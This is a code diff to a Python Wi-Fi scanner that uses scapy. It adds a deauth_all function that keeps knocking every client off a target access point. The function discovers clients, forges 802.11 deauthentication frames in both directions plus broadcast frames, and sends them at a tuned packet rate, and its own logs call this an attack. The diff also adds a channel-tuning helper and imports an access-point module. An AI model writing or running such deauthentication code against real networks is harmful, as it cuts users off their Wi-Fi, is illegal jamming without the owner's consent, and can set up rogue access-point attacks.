@@ -2,9 +2,11 @@ import subprocess
 import threading
 import time
 from pathlib import Path
+from typing import Optional, Callable
 
 from scapy.all import *
 from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11Deauth, Dot11Elt, RadioTap
+
 from ap_manager import start_ap
 
 
@@ -50,13 +52,6 @@ def _iface_mac(name: str) -> str:
 
 def start_monitor_mode(interface="wlan0"):
     print(f"Starting monitor mode on {interface}...")
-    # Unblock the interface if it's blocked by rfkill
-    try:
-        print("Unblocking wireless interface with rfkill...")
-        subprocess.run(["sudo", "rfkill", "unblock", "all"], check=False)
-    except Exception as e:
-        print(f"Warning: Could not unblock rfkill: {e}")
-    
     subprocess.run(["sudo", "airmon-ng", "check", "kill"], check=True)
     subprocess.run(["sudo", "airmon-ng", "start", interface], check=True)
     print("Monitor mode started.")
@@ -371,6 +366,171 @@ def send_deauth(ap_bssid, interface="wlan0mon", reason=7, count=1):
     print(f"Sending {count} deauth frame(s) to {target_bssid} via {send_iface} (reason={reason})")
     sendp(frame, iface=send_iface, count=max(1, int(count)), inter=0.1, verbose=False)
     return send_iface
+
+def _set_channel(interface, channel):
+    """Try to tune an interface to a specific channel. Returns True if command was issued."""
+    if not interface or not channel:
+        return False
+    try:
+        # Prefer modern 'iw'
+        subprocess.run(["sudo", "iw", "dev", interface, "set", "channel", str(int(channel))],
+                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
+        return True
+    except Exception:
+        try:
+            subprocess.run(["sudo", "iwconfig", interface, "channel", str(int(channel))],
+                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
+            return True
+        except Exception:
+            return False
+
+def deauth_all(ap_bssid,
+               interface="wlan0mon",
+               channel=None,
+               reason=7,
+               pps=30,
+               refresh_interval=15,
+               client_scan_timeout=6,
+               include_broadcast=True,
+               stop_event=None,
+               log=None):
+    """Continuously deauth all clients of an AP until stop_event is set.
+
+    Parameters:
+      ap_bssid: Target AP BSSID (aa:bb:cc:dd:ee:ff)
+      interface: Preferred interface (mon or base). We'll pick the first existing among [iface, iface+mon, base]
+      channel: If known, set the TX interface to this channel for higher hit rate
+      reason: IEEE 802.11 deauth reason code (7 = Class 3 frame received from nonassociated STA)
+      pps: Target packets per second across all frames (approximate)
+      refresh_interval: Seconds between client list refreshes
+      client_scan_timeout: Seconds to sniff for clients when refreshing
+      include_broadcast: Also send broadcast deauth frames to ff:ff:ff:ff:ff:ff
+      stop_event: Optional threading.Event to signal stop
+      log: Optional callable(msg) for progress logging
+
+    Behavior:
+      - Periodically discovers clients via scan_clients()
+      - Sends AP->client and client->AP deauth frames for each client
+      - Optionally sends broadcast deauth frames
+      - Adjusts interface to AP channel if provided
+    """
+    if not ap_bssid:
+        raise ValueError("ap_bssid is required")
+
+    target_bssid = ap_bssid.strip().lower()
+    if len(target_bssid) != 17 or target_bssid.count(":") != 5:
+        raise ValueError(f"Invalid BSSID: {ap_bssid}")
+
+    # Resolve best interface to use (prefer existing monitor interface)
+    interface = (interface or "").strip()
+    if not interface:
+        raise ValueError("interface is required")
+
+    base_iface = interface[:-3] if interface.endswith("mon") else interface
+    candidates = []
+    if interface.endswith("mon"):
+        candidates += [interface, base_iface]
+    else:
+        candidates += [interface + "mon", interface]
+
+    send_iface = None
+    tried = []
+    for cand in candidates:
+        if not cand or cand in tried:
+            continue
+        tried.append(cand)
+        if _iface_exists(cand):
+            send_iface = cand
+            break
+
+    if send_iface is None:
+        raise RuntimeError(f"No usable interface found to send deauth (tried: {', '.join([c for c in tried if c])})")
+
+    if channel:
+        _set_channel(send_iface, channel)
+
+    if log:
+        log(f"Deauth attack started on {send_iface} targeting {target_bssid} (channel={channel or 'unknown'}, pps≈{pps})")
+    else:
+        print(f"Deauth attack started on {send_iface} targeting {target_bssid} (channel={channel or 'unknown'}, pps≈{pps})")
+
+    # Control loop
+    last_refresh = 0.0
+    clients: set[str] = set()
+    zero_client_burst = 0
+
+    # Build broadcast frame once if needed
+    bcast_frame = RadioTap()/Dot11(addr1="ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid)/Dot11Deauth(reason=reason) if include_broadcast else None
+
+    # Safety for rate calculation
+    pps = max(5, int(pps))
+
+    while True:
+        if stop_event is not None and stop_event.is_set():
+            break
+
+        now = time.time()
+        if now - last_refresh >= max(3, int(refresh_interval)):
+            try:
+                # Use monitor interface for scan where possible
+                scan_iface = send_iface if send_iface.endswith("mon") else (send_iface + "mon" if _iface_exists(send_iface + "mon") else send_iface)
+                new_clients = scan_clients(target_bssid, interface=scan_iface, timeout=client_scan_timeout, force_iface_bssid=False)
+                if new_clients:
+                    clients = set(new_clients)
+                    zero_client_burst = 0
+                    if log:
+                        log(f"Clients refreshed: {len(clients)} found")
+                else:
+                    zero_client_burst += 1
+                    if log:
+                        log("No clients observed in this interval")
+            except Exception as exc:
+                if log:
+                    log(f"Client refresh error: {exc}")
+            last_refresh = now
+
+        # Construct per-iteration frames
+        frames = []
+        if include_broadcast and bcast_frame is not None:
+            frames.append(bcast_frame)
+        for sta in list(clients):
+            try:
+                # AP -> STA
+                frames.append(RadioTap()/Dot11(addr1=sta, addr2=target_bssid, addr3=target_bssid)/Dot11Deauth(reason=reason))
+                # STA -> AP (some clients obey only if they see direction both ways)
+                frames.append(RadioTap()/Dot11(addr1=target_bssid, addr2=sta, addr3=target_bssid)/Dot11Deauth(reason=reason))
+            except Exception:
+                continue
+
+        if not frames:
+            # Even with no clients, keep sending broadcast to push away probers/associating stations
+            if include_broadcast and bcast_frame is not None:
+                frames = [bcast_frame, bcast_frame]
+
+        # Try to approximate PPS by chunking sends then short sleep
+        # Send at most ~pps frames this second
+        budget = pps
+        idx = 0
+        total = len(frames)
+        while budget > 0 and total > 0:
+            burst = min(budget, total)
+            try:
+                sendp(frames[idx:idx+burst], iface=send_iface, inter=0, verbose=False)
+            except Exception as exc:
+                if log:
+                    log(f"sendp error: {exc}")
+            idx += burst
+            budget -= burst
+            # Break if we've sent all constructed frames; next loop will rebuild
+            break
+
+        # Short sleep to avoid tight loop; tune for stability
+        time.sleep(0.25)
+
+    if log:
+        log("Deauth attack stopped")
+    else:
+        print("Deauth attack stopped")
 
 if __name__ == "__main__":
     print("============== Wi-Fi Access Point Scanner ==============")
